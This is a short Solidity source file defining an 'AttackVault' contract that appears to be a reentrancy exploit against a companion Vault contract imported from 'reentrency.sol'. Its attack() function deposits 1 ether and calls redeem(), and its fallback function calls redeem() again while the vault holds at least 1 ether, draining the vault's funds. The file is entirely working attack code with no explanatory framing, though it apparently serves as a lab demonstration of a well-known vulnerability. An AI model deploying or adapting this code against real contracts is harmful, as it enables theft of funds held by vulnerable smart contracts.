pragma solidity 0.8.12;
import './reentrency.sol';



contract AttackVault {
    Vault public vault; 
    
    constructor(address _vaultAddress){
        vault = Vault(_vaultAddress);

    }

    fallback() external payable {
        if (address(vault).balance >=1 ether) {
            vault.redeem();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether); 
        vault.store{value: 1 ether}(); 
        vault.redeem();

    }
    function getBalance() public view returns (uint) {
        return address(this).balance; 
    }

}
